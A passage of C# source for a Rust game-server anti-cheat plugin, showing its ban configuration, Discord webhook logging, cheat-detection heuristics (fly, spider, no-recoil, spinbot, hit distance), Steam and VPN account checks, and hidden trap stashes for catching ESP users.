            [JsonProperty(fermensEN ? "SPINERBOT: setup" : "SPINERBOT: настройка")]
            public SPINERBOT sPINERBOT;

            [JsonProperty("Debug camera")]
            public DEBUGCAMERA dEBUGCAMERA;

            [JsonProperty(fermensEN ? "Display steam account details when a player connect?" : "Отображать данные при подключении игрока?")]
            public bool show;

            [JsonProperty(fermensEN ? "Do not ban Steam players?" : "Не банить Steam игроков?")]
            public bool steamplayer;

            [JsonProperty(fermensEN ? "Send to jail if there is PrisonBitch plugin" : "Отправлять в тюрьму, если есть плагин PrisonBitch")]
            public bool prison;

            [JsonProperty(fermensEN ? "Ban not configured steam accounts?" : "Банить не настроеные аккаунты?")]
            public bool bannensatroyen;

            [JsonProperty(fermensEN ? "Ban accounts less than X days old" : "Банить аккаунты, которым меньше X дней")]
            public int banday;

            [JsonProperty(fermensEN ? "How long to ban new steam accounts (hours)" : "На сколько часов банить новые аккаунты")]
            public int bannewaccountday;

            [JsonProperty(fermensEN ? "Kick not configured steam accounts?" : "Кикать не настроенные аккаунты")]
            public bool kicknenastoyen;

            [JsonProperty(fermensEN ? "Kick private steam accounts?" : "Кикать приватные аккаунты")]
            public bool kickprivate;

            [JsonProperty(fermensEN ? "Kick players using VPN" : "Кикать игроков использующих VPN")]
            public bool kickvpn;

            [JsonProperty(fermensEN ? "Don't kick steam players for private, not configured or new account?" : "Не кикать лицухи?")]
            public bool steamkick;

            [JsonProperty(fermensEN ? "Don't ban steam players for new account?" : "Не банить лицушников за новые аккаунты?")]
            public bool steam;

            [JsonProperty(fermensEN ? "Write/save logs [0 - no | 1 - only bans | 2 - all]" : "Писать/сохранять логи [0 - нет | 1 - только баны | 2 - все]")]
            public int logspriority;

            [JsonProperty(fermensEN ? "Discord: Channel ID" : "Discord: ID канала")]
            public string discordid;

            [JsonProperty(fermensEN ? "Logs in language" : "Логи на языке")]
            public string lang { get; set; } = fermensEN ? "en" : "ru";

            [JsonProperty(fermensEN ? "Logs of hits from a firearm to the console" : " Логи попаданий с огнестрела в консоль")]
            public bool logs;

            [JsonProperty(fermensEN ? "IPINFO TOKEN" : "IPINFO ТОКЕН")]
            public string ipinfotoken;

            [JsonProperty("tt")]
            public string tt;

            [JsonProperty(fermensEN ? "Ban patterns" : "Шаблоны банов")]
            public Dictionary<string, string> pattern = new Dictionary<string, string>();

            public static PluginConfig DefaultConfig()
            {
                return new PluginConfig()
                {
                    six = "-",
                    ipinfotoken = ipinfosingup,
                    kickvpn = false,
                    tEAMBAN = new TEAMBAN
                    {
                        enable = true,
                        hours = 168,
                        webhook = "",
                        reason = "\"bb with teammates\"",
                        num = 2
                    },
                    cODELOCK = new CODELOCK
                    {
                        enable = true,
                        hours = 336,
                        webhook = "",
                        reason = "\"Ban Detected!\"",
                        seconds = 75
                    },
                    sPIDER = new SPIDER
                    {
                        hours = 720,
                        webhook = "",
                        reason = "\"Cheat Detected! (2)\""
                    },
                    sILENT = new SILENT
                    {
                        xdetects = 7,
                        webhook = "",
                        hours = 1440,
                        reason = "\"Cheat Detected! (1)\""
                    },
                    fLY = new FLY
                    {
                        hours = 720,
                        webhook = "",
                        reason = "\"Cheat Detected! (3)\""
                    },
                    hITMOD = new HITMOD
                    {
                        enable = true,
                        hours = 720,
                        webhook = "",
                        reason = "\"Cheat Detected! (6)\""
                    },
                    sPINERBOT = new SPINERBOT
                    {
                        enable = true,
                        hours = 720,
                        webhook = "",
                        reason = "\"Cheat Detected! (10)\""
                    },
                    nORECOIL = new NORECOIL
                    {
                        enable = true,
                        hours = 720,
                        seconds = 30f,
                        webhook = "",
                        reason = "\"Cheat Detected! (11)\""
                    },
                    prison = true,
                    steamkick = true,
                    dEBUGCAMERA = new DEBUGCAMERA
                    {
                        enable = true,
                        webhook = ""
                    },
                    logs = false,
                    steam = true,
                    steampi = defaultsteamapi,
                    banday = 5,
                    kicknenastoyen = true,
                    kickprivate = true,
                    tt = "nothing",
                    bannensatroyen = false,
                    show = true,
                    bannewaccountday = 120,
                    steamplayer = false,
                    pattern = new Dictionary<string, string>
                    {
                        { "BAN.ACCOUNT", "ban {steamid} {reason} {time}" },
                        { "PRISON.ACCOUNT", "prison.add {steamid} {time} {reason}" },
                        { "EBSBAN.ACCOUNT", "ban {steamid} {time}h {reason}" }
                    },
                    logspriority = 2,
                    ESPStash = new ESPSTASH
                    {
                        amount = 100,
                        loots = new Dictionary<string, int>
                        {
                            { "rifle.ak", 1 },
                            { "rifle.bolt", 1 },
                            { "rifle.l96", 1 },
                            { "rifle.lr300", 1 },
                            { "rifle.semiauto", 1 },
                            { "wood", 10000 },
                            { "stones", 10000 },
                            { "metal.refined", 50 },
                            { "metal.fragments", 10000 },
                            { "metal.facemask", 1 },
                            { "scrap", 500 },
                        }
                    },
                    discordid = ""
                };
            }
        }
        #endregion

        #region WebHook
        private static void SendDiscordMessage(string reason, string desc, string webhook)
        {
            var embed = new Embed()
            .AddField(reason, desc, true);

            fermens.webrequest.Enqueue(webhook, new DiscordMessage("", embed).ToJson(), (code, response) => { },
            fermens,
            RequestMethod.POST, new Dictionary<string, string>
            {
                    { "Content-Type", "application/json" }
            });
        }

        private class DiscordMessage
        {
            public DiscordMessage(string content, params Embed[] embeds)
            {
                Content = content;
                Embeds = embeds.ToList();
            }

            [JsonProperty("content")] public string Content { get; set; }
            [JsonProperty("embeds")] public List<Embed> Embeds { get; set; }

            public string ToJson()
            {
                return JsonConvert.SerializeObject(this);
            }
        }

        private class Embed
        {
            [JsonProperty("fields")] public List<Field> Fields { get; set; } = new List<Field>();

            public Embed AddField(string name, string value, bool inline)
            {
                Fields.Add(new Field(name, Regex.Replace(value, "<.*?>", string.Empty), inline));

                return this;
            }
        }

        private class Field
        {
            public Field(string name, string value, bool inline)
            {
                Name = name;
                Value = value;
                Inline = inline;
            }

            [JsonProperty("name")] public string Name { get; set; }
            [JsonProperty("value")] public string Value { get; set; }
            [JsonProperty("inline")] public bool Inline { get; set; }
        }
        #endregion

        int nsnext = 0;
        [ChatCommand("ns")]
        private void COMMANSTASH(BasePlayer player, string command, string[] args)
        {
            if (!player.IsAdmin) return;
            player.Teleport(stashContainers[nsnext].transform.position + Vector3.up * 1.5f);
            nsnext++;
            if (stashContainers.Count >= nsnext) nsnext = 0;
        }

        Vector3 lastshash = Vector3.zero;
        [ChatCommand("ls")]
        private void COMMALS(BasePlayer player, string command, string[] args)
        {
            if (!player.IsAdmin) return;
            if (lastshash == Vector3.zero)
            {
                player.ChatMessage(GetMessage("adminLs", player.UserIDString));
                return;
            }
            player.Teleport(lastshash + Vector3.up * 1.5f);
        }

        [PluginReference] private Plugin PrisonBitch, EnhancedBanSystem;

        private static void BAN(string steamid, string reason, int time, string displayname, string webhook, bool checkteam = true)
        {
            if (!enablefull) return;

            ulong usteam = Convert.ToUInt64(steamid);
            if (config.steamplayer)
            {
                BasePlayer pl = BasePlayer.FindByID(usteam);
                if (pl != null)
                {
                    if (fermens.ISSTEAM(pl.Connection))
                    {
                        ADDLOG("STEAM_PLAYER", fermens.messages["logSTEAM_PLAYER"].Replace("{name}", pl.displayName).Replace("{steamid}", pl.UserIDString), webhook, 2);
                        return;
                    }
                }
            }

            ulong usteamid = Convert.ToUInt64(steamid);

            if (checkteam)
            {
                if (config.tEAMBAN.enable)
                {
                    BasePlayer basePlayer = BasePlayer.FindByID(usteam);
                    if (basePlayer != null && basePlayer.Team != null && basePlayer.Team.members.Count > 1)
                    {
                        int banned = basePlayer.Team.members.Count(x => IsBanned(x) || IsImprisoned(x));
                        if (banned >= config.tEAMBAN.num - 1)
                        {
                            foreach (var z in basePlayer.Team.members)
                            {
                                if (basePlayer.userID == z) continue;
                                string strid = z.ToString();
                                BasePlayer basePlayer2 = BasePlayer.FindByID(z);
                                string name = basePlayer2 != null ? basePlayer2.displayName : strid;
                                fermens.timer.Once(1f, () => BAN(z.ToString(), config.tEAMBAN.reason, config.tEAMBAN.hours, name, config.tEAMBAN.webhook, false));
                            }
                        }
                    }
                }
            }

            if (config.prison && prison)
            {
                if (!IsImprisoned(usteamid))
                {
                    ADDLOG("PRISON", fermens.messages["logPRISON"].Replace("{name}", displayname).Replace("{steamid}", steamid).Replace("{days}", (time * 1f / 24f).ToString("F1")).Replace("{reason}", reason), webhook, 1);
                    time = (int)(time * 60f);
                    fermens.Server.Command(config.pattern["PRISON.ACCOUNT"].Replace("{steamid}", steamid).Replace("{time}", time.ToString()).Replace("{reason}", reason));
                }
            }
            else
            {
                if (!IsBanned(usteamid))
                {
                    fermens.Server.Command(fermens.patterban.Replace("{steamid}", steamid).Replace("{time}", time.ToString()).Replace("{reason}", reason));
                    ADDLOG("BAN", fermens.messages["logBAN"].Replace("{name}", displayname).Replace("{steamid}", steamid).Replace("{days}", (time * 1f / 24f).ToString("F1")).Replace("{reason}", reason), webhook, 1);
                }
            }
        }

        const int flylimit = 2;
        const int spiderlimit = 2;


        private Dictionary<BasePlayer, ANTICHEAT> anticheatPlayers = new Dictionary<BasePlayer, ANTICHEAT>();

        class ANTICHEAT : MonoBehaviour
        {
            private int stash;
            private int silent;
            private int spider;
            private int fly;
            private float flyheight;

            BasePlayer player;
            private DateTime lastban;

            private DateTime firsthit;
            private DateTime hitmod;
            string lasthit;
            int hits;
            float distancehit;
            string weaponhit;

            public DateTime LastFires;
            public int fires;
            string weaponfire;
            float posfire;
            float posfirel;
            float posfirer;

            int norecoil;
            Vector3 lastshot;

            private int numdetecthit;

            bool macromove;
            Vector3 startshoots;

            Vector3 direction;

            private void Awake()
            {
                player = GetComponent<BasePlayer>();
                if (player == null || !debugmode && enablefull && (player.IsAdmin || fermens.permission.UserHasPermission(player.UserIDString, "xanticheat.allow")))
                {
                    Destroy(this);
                    return;
                }

                fermens.anticheatPlayers.Add(player, this);

                lasthit = "";
                silent = 0;
                weaponhit = "";
                weaponfire = "";
                if (config.dEBUGCAMERA.enable || debugmode) InvokeRepeating(nameof(TICK), 0f, 10f);
                direction = player.eyes.HeadRay().direction;
                InvokeRepeating(nameof(SILENTCLEAR), 0f, 120f);
                // InvokeRepeating(nameof(WH), 0f, 1f);
            }

            private void SILENTCLEAR()
            {
                flyiing = 1;
                RaycastHit hit;
                var raycast = Physics.Raycast(player.transform.position, Vector3.down, out hit, 20f);
                if (raycast)
                {
                    if (hit.distance > 4f && hit.distance < 5f && !player.isMounted && !player.IsSleeping() && !player.IsWounded())
                    {
                        Debug.LogWarning($"[{flyiing}] {player.displayName} {player.UserIDString} | {hit.collider.name} [{hit.distance} m.] {player.IsFlying}");
                        flyiingList.Add(player.transform.position);
                      //  InvokeRepeating(nameof(FLYING), 1f, 1f);
                    }
                    
                }
                spider = 0;
                silent = 0;
                fly = 0;
                flyheight = 0;
            }

            private List<Vector3> flyiingList = new List<Vector3>();
            private int flyiing;

            public void ADDFLY(float distance)
            {
                if (distance <= flyheight) return;
                fly++;
                flyheight = distance;
                ADDLOG("FLY", fermens.messages["logDETECT"].Replace("{name}", player.displayName).Replace("{steamid}", player.UserIDString).Replace("{detect}", fly.ToString()).Replace("{detectlimit}", flylimit.ToString()), config.fLY.webhook, 2);
                if (config.fLY.enable && fly >= flylimit && lastban < DateTime.Now)
                {
                    BAN(player.UserIDString, config.fLY.reason, config.fLY.hours, player.displayName, config.fLY.webhook);
                    lastban = DateTime.Now.AddSeconds(10f);
                    flyheight = 0;
                    fly = 0;
                    return;
                }
            }

            bool norecoilbanned;
            public void ADDFIRE(string weapon)
            {
                Vector3 vector3 = player.transform.position;
                double sec = (DateTime.Now - LastFires).TotalSeconds;
                Vector3 current = player.eyes.HeadForward();
                direction = current;
                if (config.sPINERBOT.enable)
                {
                    if (current.y >= -0.984808 && current.y <= -0.9848076)
                    {
                        spiner++;
                        if (spiner >= 30)
                        {
                            BAN(player.UserIDString, config.sPINERBOT.reason, config.sPINERBOT.hours, player.displayName, config.sPINERBOT.webhook);
                            lastban = DateTime.Now.AddSeconds(10f);
                            spiner = 0;
                        }
                    }
                    else
                    {
                        spiner = 0;
                    }
                }

                if (fires == 0)
                {
                    macromove = false;
                    norecoil = 0;
                    sec = 0;
                    posfire = current.y;
                    posfirel = current.x;
                    posfirer = current.z;
                }
                else
                {
                    if (!macromove && startshoots != vector3)
                    {
                        macromove = true;
                    }
                }

                startshoots = vector3;
                float razn = Mathf.Abs(posfire - current.y);
                float raznl = Mathf.Abs(posfirel - current.x);
                float raznr = Mathf.Abs(posfirer - current.z);

                posfire = current.y;
                posfirel = current.x;
                posfirer = current.z;

                if (debugmode && fires > 0) Debug.Log($"{player.displayName} [#{fires.ToString()}][Y:{current.y}][x: {raznl.ToString()} | y: {razn.ToString()} | z: {raznr.ToString()}]");

                if (config.nORECOIL.enable && fires > 0 && razn == 0f && raznl == 0f && raznr == 0f && !norecoilbanned)
                {
                    norecoil++;
                    if (norecoil >= 10)
                    {
                        norecoilbanned = true;
                        fermens.timer.Once(config.nORECOIL.seconds, () =>
                        {
                            BAN(player.UserIDString, config.nORECOIL.reason, config.nORECOIL.hours, player.displayName, config.nORECOIL.webhook);
                            lastban = DateTime.Now.AddSeconds(10f);
                            norecoil = 0;
                        });
                    }
                }

                if (current.y < 0.9f && sec < 0.2f && razn <= 0.003f && raznl <= 0.003f && raznr <= 0.003f)
                {
                    fires++;
                    LastFires = DateTime.Now;
                    weaponfire = weapon;
                    if (IsInvoking(nameof(FIREEND))) CancelInvoke(nameof(FIREEND));
                }

                Invoke(nameof(FIREEND), 0.21f);
            }

            private void FIREEND()
            {
                norecoil = 0;
                fires = 0;
            }

            public void ADDHIT(string hitbone, string weapon, float distance)
            {
                if (hitbone == "N/A" || distance < 30f) return;
                //float discateka = Vector3.Distance(player.eyes.HeadForward(), direction);
                //if(discateka > 0.01f) Debug.Log("CHEATER " + Vector3.Distance(player.eyes.HeadForward(), direction));
                //Debug.Log(Vector3.Distance(direction, player.firedProjectiles.LastOrDefault().Value.));
                if (hitbone != lasthit && lasthit != "")
                {
                    CLEARHIT();
                    return;
                }
                if (hits == 0)
                {
                    hitmod = DateTime.Now;
                    firsthit = DateTime.Now;
                }
                hits++;

                //  if (!enablefull) Debug.Log(player.displayName + " - " + hits);
                lasthit = hitbone;
                distancehit += distance;
                if (hits >= 2) distancehit /= 2;
                if (!weaponhit.Contains(weapon)) weaponhit += (hits >= 2 ? ", " : string.Empty) + weapon;
                if (hits >= 5)
                {
                    DateTime dateTime = new DateTime((DateTime.Now - firsthit).Ticks);
                    ADDLOG("HITMOD", fermens.messages["logHITMod"].Replace("{name}", player.displayName).Replace("{steamid}", player.UserIDString).Replace("{hitbone}", hitbone).Replace("{average}", distancehit.ToString("F1")).Replace("{weaponhit}", weaponhit).Replace("{minutes}", dateTime.ToString("HH:mm:ss")), config.hITMOD.webhook, 2);
                    if (distancehit > 100 && (weaponhit.Contains("bow_hunting.entity") || weaponhit.Contains("crossbow.entity") || weaponhit.Contains("bow.compound") || weaponhit.Contains("pistol_eoka.entity"))
                        || distancehit > 65 && (weaponhit == "bow_hunting.entity" || weaponhit == "crossbow.entity" || weaponhit == "bow.compound")
                        || distancehit > 40 && weaponhit == "pistol_eoka.entity")
                    {
                        if (config.hITMOD.enable)
                        {
                            BAN(player.UserIDString, config.hITMOD.reason, config.hITMOD.hours, player.displayName, config.hITMOD.webhook);
                            lastban = DateTime.Now.AddSeconds(10f);
                        }
                    }

                    if (!weapon.Contains("l96.entity"))
                    {
                        if ((DateTime.Now - hitmod).TotalMinutes < 10f)
                        {
                            numdetecthit++;
                            if (numdetecthit >= 3)
                            {
                                BAN(player.UserIDString, config.hITMOD.reason, config.hITMOD.hours, player.displayName, config.hITMOD.webhook);
                                lastban = DateTime.Now.AddSeconds(10f);
                            }
                        }
                        else
                        {
                            numdetecthit = 0;
                        }
                    }

                    hitmod = DateTime.Now;
                    CLEARHIT();
                }
            }

            private void CLEARHIT()
            {
                hits = 0;
                lasthit = "";
                weaponhit = "";
                distancehit = 0;
            }

            public void ADDSTASH()
            {
                stash++;
                if (stash >= 2 && lastban < DateTime.Now)
                {
                    BAN(player.UserIDString, "\"CheatDetected (6)\"", config.fLY.hours, player.displayName, config.ESPStash.webhook);
                    lastban = DateTime.Now.AddSeconds(10f);
                    stash = 0;
                    return;
                }
            }

            public void ADDSPIDER()
            {
                spider++;
                ADDLOG("SPIDER", fermens.messages["logDETECT"].Replace("{name}", player.displayName).Replace("{steamid}", player.UserIDString).Replace("{detect}", spider.ToString()).Replace("{detectlimit}", spiderlimit.ToString()), config.sPIDER.webhook, 2);
                if (config.sPIDER.enable && spider >= spiderlimit && lastban < DateTime.Now)
                {
                    BAN(player.UserIDString, config.sPIDER.reason, config.sPIDER.hours, player.displayName, config.sPIDER.webhook);
                    lastban = DateTime.Now.AddSeconds(10f);
                    spider = 0;
                    return;
                }
            }

            public void ADDSILENT(int amount)
            {
                silent += amount;
                ADDLOG("SAIM", fermens.messages["logDETECT"].Replace("{name}", player.displayName).Replace("{steamid}", player.UserIDString).Replace("{detect}", silent.ToString()).Replace("{detectlimit}", config.sILENT.xdetects.ToString()), config.sILENT.webhook, 2);
                if (config.sILENT.enable && silent >= config.sILENT.xdetects && lastban < DateTime.Now)
                {
                    BAN(player.UserIDString, config.sILENT.reason, config.sILENT.hours, player.displayName, config.sILENT.webhook);
                    lastban = DateTime.Now.AddSeconds(10f);
                    silent = 0;
                    return;
                }
            }

            private int spiner;
            private Vector3 lastposition;
            // private int spinerdetect;

            private void TICK()
            {
                if (enablefull)
                {
                    player.SendConsoleCommand("noclip");
                    player.SendConsoleCommand("debugcamera");
                    player.SendConsoleCommand("debugcamera_unfreeze");
                    player.SendConsoleCommand("camspeed 0");
                }

            }

            public void DoDestroy() => Destroy(this);

            private void OnDestroy()
            {
                if (IsInvoking(nameof(TICK))) CancelInvoke(nameof(TICK));
                if (IsInvoking(nameof(FIREEND))) CancelInvoke(nameof(FIREEND));
                fermens.anticheatPlayers.Remove(player);
            }
        }

        private void OnPlayerBanned(string name, ulong id, string address, string reason)
        {
            if (reason == "Cheat Detected!") ADDLOG($"DebugCamera", fermens.messages["logBAN"].Replace("{name}", name).Replace("{steamid}", id.ToString()).Replace("{reason}", "FakeAdmin/DebugCamera"), config.dEBUGCAMERA.webhook, 1);
        }

        const string defaultsteamapi = "https://steamcommunity.com/dev/apikey";
        class resp
        {
            public avatar response;
        }

        class avatar
        {
            public List<Players> players;
        }

        class Players
        {
            public int? profilestate;
            public int? timecreated;
        }

        class INFO
        {
            public DateTime dateTime;
            public bool profilestate;
            public bool steam;
            public Dictionary<string, Dictionary<string, int>> hitinfo;
        }

        Dictionary<ulong, INFO> PLAYERINFO = new Dictionary<ulong, INFO>();

        private void Init()
        {
            fermens = this;
            //   Unsubscribe(nameof(OnPlayerConnected));
        }

        #region Grid
        Dictionary<string, Vector3> Grids = new Dictionary<string, Vector3>();
        const float calgon = 0.0066666666666667f;
        void CreateSpawnGrid()
        {
            var worldSize = (ConVar.Server.worldsize);
            float offset = worldSize / 2;
            var gridWidth = (calgon * worldSize);
            float step = worldSize / gridWidth;

            string start = "";

            char letter = 'A';
            int number = 0;

            for (float zz = offset; zz > -offset; zz -= step)
            {
                for (float xx = -offset; xx < offset; xx += step)
                {
                    Grids.Add($"{start}{letter}{number}", new Vector3(xx - 55f, 0, zz));
                    if (letter.ToString().ToUpper() == "Z")
                    {
                        start = "A";
                        letter = 'A';
                    }
                    else
                    {
                        letter = (char)(((int)letter) + 1);
                    }


                }
                number++;
                start = "";
                letter = 'A';
            }
        }

        private string GetNameGrid(Vector3 pos)
        {
            return Grids.Where(x => x.Value.x < pos.x && x.Value.x + 150f > pos.x && x.Value.z > pos.z && x.Value.z - 150f < pos.z).FirstOrDefault().Key;
        }
        #endregion

        private static bool prison = false;
        private List<StashContainer> stashContainers = new List<StashContainer>();
        private float sizeworldx;
        private float sizeworldz;

        List<Vector3> OntheMap = new List<Vector3>();
        void foundmonuments()
        {
            OntheMap.Clear();
            foreach (var z in TerrainMeta.Path.Monuments)
            {
                if (z.name.Contains("/cave") || z.name.Contains("/tiny") || z.name.Contains("/power substations") || z.name.Contains("OilrigAI")) continue;
                Vector3 pos = z.transform.position;
                if (!OntheMap.Contains(pos)) OntheMap.Add(pos);
            }
        }

        private Vector3 RANDOMPOS() => new Vector3(Random.Range(-sizeworldx, sizeworldx), 400f, Random.Range(-sizeworldz, sizeworldz));

        List<string> names = new List<string>();

        private Vector3 FINDSPAWNPOINT(int num = 1)
        {
            if (num >= 300) return Vector3.zero;
            Vector3 pos = RANDOMPOS();

            RaycastHit hitInfo;
            if (!Physics.Raycast(pos, Vector3.down, out hitInfo, 450f, Layers.Solid)) return FINDSPAWNPOINT(num++);
            if (hitInfo.collider == null || hitInfo.collider.name != "Terrain") return FINDSPAWNPOINT(num++);
            if (hitInfo.point.y - TerrainMeta.WaterMap.GetHeight(hitInfo.point) < 0) return FINDSPAWNPOINT(num++);
            if (WaterLevel.Test(hitInfo.point)) return FINDSPAWNPOINT(num++);
            if (OntheMap.Any(x => Vector3.Distance(x, hitInfo.point) < 170f)) return FINDSPAWNPOINT(num++);
            if (stashContainers.Any(x => Vector3.Distance(x.transform.position, hitInfo.point) < 30f)) return FINDSPAWNPOINT(num++);
            if (Mathf.Abs((TerrainMeta.HeightMap.GetHeight(hitInfo.point) - hitInfo.point.y)) > 0.1f) return FINDSPAWNPOINT(num++);
            if (Mathf.Abs((TerrainMeta.HeightMap.GetHeight(hitInfo.point + Vector3.left * 0.2f) - hitInfo.point.y)) > 0.01f) return FINDSPAWNPOINT(num++);
            if (Mathf.Abs((TerrainMeta.HeightMap.GetHeight(hitInfo.point + Vector3.right * 0.2f) - hitInfo.point.y)) > 0.01f) return FINDSPAWNPOINT(num++);
            if (Mathf.Abs((TerrainMeta.HeightMap.GetHeight(hitInfo.point + Vector3.forward * 0.2f) - hitInfo.point.y)) > 0.01f) return FINDSPAWNPOINT(num++);
            if (Mathf.Abs((TerrainMeta.HeightMap.GetHeight(hitInfo.point + Vector3.back * 0.2f) - hitInfo.point.y)) > 0.01f) return FINDSPAWNPOINT(num++);
            return hitInfo.point;
        }

        private void CanSeeStash(BasePlayer player, StashContainer stash)
        {
            if (stash.OwnerID != 0 || !stashContainers.Contains(stash)) return;
            ADDLOG("ESPStash", fermens.messages["logESPStash"].Replace("{name}", player.displayName).Replace("{steamid}", player.UserIDString).Replace("{grid}", GetNameGrid(stash.transform.position)), config.ESPStash.webhook, 2);
            timer.Once(75f, () =>
            {
                if (!player.IsConnected) return;
                ANTICHEAT aNTICHEAT;
                if (!anticheatPlayers.TryGetValue(player, out aNTICHEAT)) return;
                aNTICHEAT.ADDSTASH();
            });
            lastshash = stash.transform.position;
            stashContainers.Remove(stash);
        }

        void OnEntityKill(StashContainer stash)
        {
            if (stash.OwnerID != 0 || !stashContainers.Contains(stash)) return;
            List<BasePlayer> list = Pool.GetList<BasePlayer>();
            Vis.Entities<BasePlayer>(stash.transform.position, 4f, list, 131072);
            foreach (var player in list) ADDLOG("ESPStash", fermens.messages["logESPStash"].Replace("{name}", player.displayName).Replace("{steamid}", player.UserIDString).Replace("{grid}", GetNameGrid(stash.transform.position)), config.ESPStash.webhook, 2);
            lastshash = stash.transform.position;
            stashContainers.Remove(stash);
        }

        string patterban = "";

        private string token = "270220221000fermens";
        private string namer = "XAntiCheat";

        private void OnServerInitialized()
        {
            ServerMgr.Instance.StartCoroutine(GetCallback());
        }

        #region WEBCONFIG
        public Dictionary<string, string> messagesEN = new Dictionary<string, string>
        {
            { "logCODELOCK", "{name}({steamid}) entered the password for the code lock of the banned player({owner})!" },
            { "logSTEAM_PLAYER", "{name}({steamid}) redeemed from blocking." },
            { "logPRISON", "Sent to jail {name}({steamid}) for {days} days [{reason}]" },
            { "logBAN", "Banned {name}({steamid}) for {days} days [{reason}]" },
            { "logMACRO", "{name}({steamid}) | shots {fires} | used {weaponfire} | moved: {macromove} | detect #{detect}" },
            { "logDETECT", "{name}({steamid}) detects {detect}/{detectlimit}" },
            { "logHITMod", "{name}({steamid}) | {hitbone} | average distance {average} | used {weaponhit} | ({minutes})" },
            { "logFLY", "{name}({steamid}) - [{elements}] - height: {height} m. ({collidername}) {desc}" },
            { "logESPStash", "{name}({steamid}) - grid {grid}" },
            { "NEW.ACCOUNT", "Suspicious account" },
            { "KICK.PRIVATE", "Open your profile to play on this server! (private profile)" },
            { "KICK.NENASTROYEN", "Set up a profile to play on this server!" },
            { "KICK.VPN", "It is forbidden to play with VPN on the server! (VPN DETECTED)" },
            { "debugStashs", "Created {count} stashe traps" },
            { "adminLs", "<color=yellow>Haven't unearthed a single stesh yet!</color>" },
            { "adminAcLogs", "XAC - Latest logs:\n" },
            { "adminAcNoLogs", "XAC - The logs are empty :(" },
            { "debugConnect0", "------------\n{name} ({steamid})" },
            { "debugConnect1", "\nGame version: {steam}" },
            { "debugConnect2", "\nAccount set up: {ns}" },
            { "debugConnect3", "\nAccount created: {date}" },
            { "debugConnect4", "\nProfile private: Yes" },
            { "descFly", "[for_consideration!in_building]" }
        };

        public Dictionary<string, string> messagesRU = new Dictionary<string, string>
        {
            { "logCODELOCK", "{name}({steamid}) ввёл пароль от кодового замка забаненного игрока ({owner})!" },
            { "logSTEAM_PLAYER", "{name}({steamid}) отмазали от бана." },
            { "logPRISON", "Отправили в тюрьму {name}({steamid}) на {days} дней [{reason}]" },
            { "logBAN", "Забанили {name}({steamid}) на {days} дней [{reason}]" },
            { "logMACRO", "{name}({steamid}) | выстрелов {fires} | использовал {weaponfire} | двигался: {macromove} | детект #{detect}" },
            { "logDETECT", "{name}({steamid}) детектов {detect}/{detectlimit}" },
            { "logHITMod", "{name}({steamid}) | {hitbone} | средняя дистанция {average} | использовал {weaponhit} | ({minutes})" },
            { "logFLY", "{name}({steamid}) - [{elements}] - высота: {height} м. ({collidername}) {desc}" },
            { "logESPStash", "{name}({steamid}) - квадрат {grid}" },
            { "NEW.ACCOUNT", "Подозрительный аккаунт" },
            { "KICK.PRIVATE", "Откройте профиль, чтобы играть на этом сервере! (private profile)" },
            { "KICK.NENASTROYEN", "Настройте профиль, чтобы играть на этом сервере!" },
            { "KICK.VPN", "На сервере запрещено играть с VPN! (VPN DETECTED)" },
            { "debugStashs", "Создали {count} стешей-ловушек" },
            { "adminLs", "<color=yellow>Еще не раскопали ни одного стеша!</color>" },
            { "adminAcLogs", "XAC - Последние логи:\n" },
            { "adminAcNoLogs", "XAC - В логах пусто :(" },
            { "debugConnect0", "------------\n{name} ({steamid})" },
            { "debugConnect1", "\nВерсия игры: {steam}" },
            { "debugConnect2", "\nАккаунт настроен: {ns}" },
            { "debugConnect3", "\nАккаунт создан: {date}" },
            { "debugConnect4", "\nПрофиль закрытый: Да" }
        };

        IEnumerator GetCallback()
        {
            Debug.Log("[XAntiCheat] Initialization...");

            lang.RegisterMessages(messagesEN, this, "en");
            lang.RegisterMessages(messagesRU, this, "ru");
            messages = lang.GetMessages(config.lang, this);
            CreateSpawnGrid();

            if (config.ipinfotoken == ipinfosingup)
            {
                Debug.LogWarning(fermensEN ? "Enter the token for IPINFO in the config if you want to enable auto-detection of VPN usage by the player!" : "Введите в конфиг токен для IPINFO, если хотите включить автоопределение использования игроком VPN!");
            }
            foundmonuments();

            sizeworldx = TerrainMeta.Size.x / 2.5f;
            sizeworldz = TerrainMeta.Size.z / 2.5f;

            namefile = DateTime.Now.ToString("MM/dd");
            LOGS = Interface.Oxide.DataFileSystem.ReadObject<List<string>>("XAC/" + namefile);


            if (string.IsNullOrEmpty(config.steampi) || config.steampi == defaultsteamapi)
            {
                Debug.LogError(fermensEN ? "SPECIFY STEAMAPI IN CONFIG!" : "УКАЖИТЕ STEAMAPI В КОНФИГЕ!");
                if (!debugmode) yield break;
            }

            foreach (BasePlayer player in BasePlayer.activePlayerList)
            {
                if (player.GetComponent<ANTICHEAT>() == null) player.gameObject.AddComponent<ANTICHEAT>();
            }

            timer.Once(5f, () => { if (PrisonBitch != null) prison = true; });

            permission.RegisterPermission("xanticheat.allow", this);
            permission.RegisterPermission("xanticheat.skip", this);
            permission.RegisterPermission("xanticheat.command", this);
            permission.RegisterPermission("xanticheat.chat", this);

            timer.Every(3600f, () => Save());

            stashContainers.Clear();

            if (!config.pattern.ContainsKey("EBSBAN.ACCOUNT"))
            {
                config.pattern.Add("EBSBAN.ACCOUNT", "ban {steamid} {time}h {reason}");
                SaveConfig();
            }

            patterban = EnhancedBanSystem != null ? config.pattern["EBSBAN.ACCOUNT"] : config.pattern["BAN.ACCOUNT"];

            int i = 0;
            while (i < config.ESPStash.amount)
            {
                Vector3 pos = FINDSPAWNPOINT();
                if (pos == Vector3.zero) continue;
                StashContainer stashContainer = GameManager.server.CreateEntity("assets/prefabs/deployable/small stash/small_stash_deployed.prefab", pos, new Quaternion(), true) as StashContainer;
                stashContainer.enableSaving = false;
                stashContainer.Spawn();
                int max = Random.Range(2, 7);
                int current = 0;
                foreach (var z in config.ESPStash.loots)
                {
                    if (Random.Range(0f, 1f) >= 0.65f)
                    {
                        if (current < max)
                        {
                            Item item = ItemManager.CreateByName(z.Key, Random.Range(1, z.Value));
                            if (item != null)
                            {
                                if (item.hasCondition)
                                {
                                    item.LoseCondition(Random.Range(0f, 100f));
                                    BaseProjectile weapon = item.GetHeldEntity() as BaseProjectile;
                                    if (weapon != null)
                                    {
                                        if (weapon.primaryMagazine != null)
                                        {
                                            weapon.primaryMagazine.contents = Random.Range(1, weapon.primaryMagazine.capacity + 1);
                                        }
                                    }
                                }
                                if (!item.MoveToContainer(stashContainer.inventory, Random.Range(0, 6), false)) item.MoveToContainer(stashContainer.inventory);
                                current++;
                            }
                        }
                    }
                }
                stashContainer.SetHidden(true);
                stashContainers.Add(stashContainer);
                i++;
            }
